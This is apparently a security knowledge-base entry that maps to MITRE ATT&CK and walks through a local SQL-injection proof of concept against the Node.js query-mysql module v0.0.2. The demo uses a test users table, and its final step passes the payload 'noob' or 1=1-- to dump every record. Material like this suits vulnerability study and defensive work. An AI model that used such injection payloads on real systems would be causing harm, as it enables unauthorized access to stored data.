---
tags:
  - sqli
  - node.js
  - mysql
  - injection
  - exploitation
  - data-exfiltration
type: attack_chain
tools:
  - '[[tools/NPM-Package-Manager]]'
  - '[[tools/MySQL-Command-Line-Client]]'
  - '[[tools/Node.js-Runtime]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Node.js
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-query-mysql-Module]]'
  - '[[procedures/Setup-Test-MySQL-Database-and-Table]]'
  - '[[procedures/Populate-Database-with-Sample-Data]]'
  - '[[procedures/Demonstrate-Normal-Data-Fetch]]'
  - '[[procedures/Exploit-SQL-Injection-with-Malicious-Input]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Server Software Component]]'
updated_at: '2025-12-14T03:46:15.098Z'
description: >-
  Demonstrates SQL injection vulnerability in the Node.js query-mysql module
  (v0.0.2) by concatenating unsanitized user input into SQL queries, allowing
  arbitrary SQL execution to dump all records from a test database.
skill_level: intermediate
impact_level: high
id: 33b0d9e6-6fe5-42c8-b030-48b4e35b4379
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Server Software Component]]'
---
# SQL Injection in query-mysql Module to Exfiltrate All Database Records

Multi-stage attack chain demonstrating exploitation of SQL injection in the Node.js 'query-mysql' module version 0.0.2, where user inputs for table, name_id, and id are concatenated directly into SQL queries without sanitization, enabling arbitrary SQL execution and data exfiltration from a MySQL database.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Prepare Database]
    B --> C[Normal Query Test]
    C --> D[Inject Malicious Payload]
    D --> E[Exfiltrate Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/NPM-Package-Manager]]
- [[tools/MySQL-Command-Line-Client]]
- [[tools/Node.js-Runtime]]

### Target Environment

- Node.js v8.9.3 or compatible
- MySQL 5.7.13 running locally on 127.0.0.1
- npm 5.5.1
- Local network access to MySQL (port 3306 implied)

### Initial Access Requirements

- Local administrative access to install Node.js modules and run MySQL commands
- Root credentials for MySQL (default: user 'root', password 'root')
- No remote access needed; this is a local development environment simulation

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-query-mysql-Module]]

**Objective**: Install the vulnerable query-mysql module to set up the exploitation environment.

**Instructions**: Use [[commands/npm-install-query-mysql]] to add the module as a dependency in a Node.js project.

```bash
npm install query-mysql
```

**Expected Output**: Module installed in node_modules directory, package.json updated with dependency.

**Success Indicators**:
- 'query-mysql' folder appears in node_modules
- No installation errors

### Step 2: Setup Test Database
procedure: [[procedures/Setup-Test-MySQL-Database-and-Table]]

**Objective**: Create a test MySQL database and 'users' table to simulate a target for injection.

**Instructions**: Log into MySQL and execute [[commands/mysql-drop-create-users-table]] to drop any existing table and create a new one with username and password columns.

```bash
mysql -u root -p
DROP TABLE IF EXISTS `users`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!40101 SET character_set_client = utf8 */; CREATE TABLE `users` ( `username` varchar(50) DEFAULT NULL, `password` varchar(50) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
```

**Expected Output**: Query OK, table created successfully.

**Success Indicators**:
- Table 'users' exists in the 'test' database
- No errors during creation

### Step 3: Populate Sample Data
procedure: [[procedures/Populate-Database-with-Sample-Data]]

**Objective**: Insert sample user records to provide data for exfiltration during exploitation.

**Instructions**: In the MySQL session, run [[commands/mysql-insert-sample-users]] to add admin, user, and noob records.

```bash
INSERT INTO users (username, password) VALUES ('admin', 'admin'), ('user', 'user'), ('noob', 'noob');
```

Verify with [[commands/mysql-select-all-users]]:

```bash
SELECT * FROM users;
```

**Expected Output**: 3 rows inserted; query shows admin/user/noob records.

**Success Indicators**:
- 3 rows in users table
- Data visible via SELECT

### Step 4: Normal Query Execution
procedure: [[procedures/Demonstrate-Normal-Data-Fetch]]

**Objective**: Create and run a sample Node.js app to fetch a single record normally, confirming setup.

**Instructions**: Write app.js with module configuration and normal fetchById call using [[commands/node-normal-fetch]] parameters, then execute [[commands/node-run-app]].

```bash
const query = require('query-mysql'); query.configure({ 'host':'127.0.0.1', 'user':'root', 'password':'root', 'database':'test' }); query.base.fetchById('users','noob','username',(msg, res)=>{ console.log(msg, res) });
node app.js
```

**Expected Output**: Single RowDataPacket for 'noob' user.

**Success Indicators**:
- Only 'noob' record returned
- No errors in console

### Step 5: Exploit Injection
procedure: [[procedures/Exploit-SQL-Injection-with-Malicious-Input]]

**Objective**: Modify the app to inject malicious SQL payload, altering the query to return all records.

**Instructions**: Update app.js id parameter to [[commands/node-malicious-fetch]] payload, then re-run [[commands/node-run-app]].

```bash
query.base.fetchById('users','noob\' or 1=1-- ','username',(msg, res)=>{ console.log(msg, res) });
node app.js
```

**Expected Output**: All 3 RowDataPackets (admin, user, noob).

**Success Indicators**:
- Multiple records returned instead of one
- Query effectively becomes SELECT * FROM users WHERE username='noob' or 1=1--

## Attack Chain Summary

### Key Achievements

1. Installed vulnerable module and setup test environment
2. Prepared database with sensitive sample data
3. Demonstrated normal functionality
4. Injected SQL to bypass WHERE clause
5. Exfiltrated all user records via arbitrary query execution

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Server Software Component]] Server Software Component: Database Services

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
